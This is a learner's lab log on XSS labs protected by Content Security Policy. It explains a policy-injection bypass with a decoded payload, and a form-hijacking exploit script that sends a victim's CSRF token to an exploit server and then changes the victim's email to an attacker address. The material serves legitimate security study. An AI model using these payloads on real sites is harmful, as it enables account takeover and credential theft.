# Day 32: Two CSP Bypass Labs (Policy Injection, Form Hijacking) and New JavaScript Concepts

- Lab: Reflected XSS protected by CSP, with CSP bypass, solved (Expert)
- Lab: Reflected XSS protected by very strict CSP, with dangling markup attack, solved (Practitioner)
- Lab: Exploiting cross-site scripting to capture passwords, not solved (Practitioner), requires Burp Collaborator which is a Professional-only feature not available in Burp Suite Community Edition

Roadmap: 2C XSS section is now complete except for the one lab above. Every other lab in XSS, from Apprentice through Expert, is solved.

## What I learned

### Reflected XSS protected by CSP, with CSP bypass

Delivered by visiting a crafted URL directly.

URL encoding used:

```
%3C → <     %3E → >     %28 → (     %29 → )     %2F → /     %20 → space     %27 → '
```

The payload, decoded for readability:

```
search=<script>alert(1)</script>
token=;script-src-elem 'unsafe-inline'
```

How it works, step by step:

- The page reflects the search parameter directly into the page as HTML, but a CSP header blocks any inline script from running
- The CSP header is built on the server using a token value that I control, and nothing sanitises it
- A semicolon in CSP syntax ends the current directive and starts a new one, so my token value opens with a semicolon to close the original directive early and inject a brand new one
- script-src-elem specifically controls script elements, and 'unsafe-inline' tells the browser that inline script tags are allowed to run
- CSP has a rule that when a directive type appears more than once in a policy, only the first occurrence is enforced and later ones are ignored. The original policy had no script-src-elem directive at all, so my injected one becomes the only, and therefore the first, one. It wins over the broader script-src directive for script elements specifically
- With that directive now in force, the injected script tag from the search parameter is allowed to execute
- One sentence: smuggle a new, permissive script-src-elem directive into the CSP header through an unsanitised reporting parameter, so the reflected script is allowed to run

My notes:

- This is a different kind of CSP bypass than the AngularJS sandbox lab from Day 31. That one found a loophole inside an untouched policy. This one edits the policy itself through an injection point the developers did not sanitise

### Reflected XSS protected by very strict CSP, with dangling markup attack

Despite the lab title, the official solution does not use a literal dangling markup payload. It uses a form hijacking attack through a missing form-action directive in the CSP.

Delivered through the exploit server.

How it works, step by step:

- The change email form has client-side validation that rejects obvious XSS payloads. Using DevTools, the email input's type attribute can be changed from email to text, which turns off the browser's built-in format check
- Submitting a payload through the form field shows it reflected back but properly HTML-escaped, so the server is sanitising that path correctly
- The email parameter in the URL is a separate code path that pre-fills the same input, and it reflects the payload unescaped. A quote character in the payload closes the input's value attribute early, letting a real HTML element be injected immediately after it
- The injected element cannot be a script tag or use an event handler, because CSP blocks both. Instead, a real button with a formaction attribute is injected. formaction overrides where the enclosing form submits to, for that one button, and this is native browser behaviour that CSP has no directive to block, since the policy is missing a form-action restriction
- Clicking the injected button submits the real change-email form, CSRF token included, but to the exploit server instead of the real site
- The form originally submits by POST, which hides its data in the request body. Adding formmethod="get" to the button forces that same form to submit by GET instead, which puts every field, CSRF token included, directly into the URL the exploit server receives
- One sentence: since CSP forgot to restrict where forms can submit, inject a button that hijacks the real form's destination, first in GET mode to steal the CSRF token, then replay that token to change the victim's email automatically

My notes on the automation script and its new JavaScript concepts:

```js
const url = new URL(location);
const csrf = url.searchParams.get('csrf');

if (csrf) {
    const form = document.createElement('form');
    const email = document.createElement('input');
    const token = document.createElement('input');

    token.name = 'csrf';
    token.value = csrf;
    email.name = 'email';
    email.value = 'hacker@evil-user.net';

    form.method = 'post';
    form.action = `${academyFrontend}my-account/change-email`;
    form.append(email);
    form.append(token);
    document.documentElement.append(form);
    form.submit();
} else {
    location = `${academyFrontend}my-account?email=blah@blah%22%3E%3Cbutton+formaction=${exploitServer}%20formmethod=get%20type=submit%3EClick%20me%3C/button%3E`;
}
```

- const: declares a name for a value and locks it so it cannot be reassigned later. It is used here simply so the important values (the two site URLs, the form, the token) cannot be accidentally overwritten further down in the script
- location: a value every page's own JavaScript can read, holding the full address of the page currently open in the browser. Setting location to a new string, as in the else branch, forces the browser to navigate there immediately, the same as typing a new address into the bar
- new URL(location): takes the raw address text and turns it into a structured object the browser understands in labelled parts, such as its domain, its path, and its query parameters, instead of one long string that would need to be manually cut apart
- searchParams: a built-in tool on that structured URL object, specifically for reading the key and value pairs that appear after the question mark in a URL
- .get('csrf'): asks searchParams for the value of one specific key. If a csrf key exists in the URL, it returns that value. If it does not exist, it returns nothing, which JavaScript treats as false inside an if check
- document.createElement('form'): builds a brand new HTML element entirely in memory. It does not appear anywhere on the page until it is explicitly attached to it
- element.append(childElement): attaches one element inside another, as a child. Used here to put the email and token inputs inside the newly created form
- document.documentElement: refers to the page's own outermost html element. Appending the form here places it onto the actual visible page, which is required before a form can be submitted
- form.submit(): triggers the form's submission in code, exactly as if a user had clicked its submit button, without needing any click at all
- Template literals, the backtick strings with ${...} inside: a way of building a string that automatically inserts the current value of a variable at that exact spot, avoiding manual string concatenation

## Key takeaways

- Two different CSP bypasses solved today use two different weaknesses: one edits the CSP header itself through an unsanitised value, the other exploits a directive the policy simply forgot to include
- A form with formaction and formmethod attributes can hijack where and how an existing form submits, entirely through native HTML, with no script and nothing for CSP to block
- Reading a victim's own current URL inside a script, with new URL(location) and searchParams.get(...), is how a single page can behave differently depending on what has already happened to the visitor, which is what makes a two-step attack self-automating after the first click
- A form built and submitted entirely by a script, using createElement, append, and submit, requires no human interaction, but the step that gets the token in the first place still needs a real click, because scripts cannot act across two different websites

## Blocked lab

This lab needs an out-of-band interaction channel (Burp Collaborator) to capture credentials sent to an external server, and Collaborator ships only with Burp Suite Professional. The Web Security Academy's own in-browser Burp instance includes temporary Pro access with Collaborator, so that is the path to revisit this lab without buying a Pro licence.
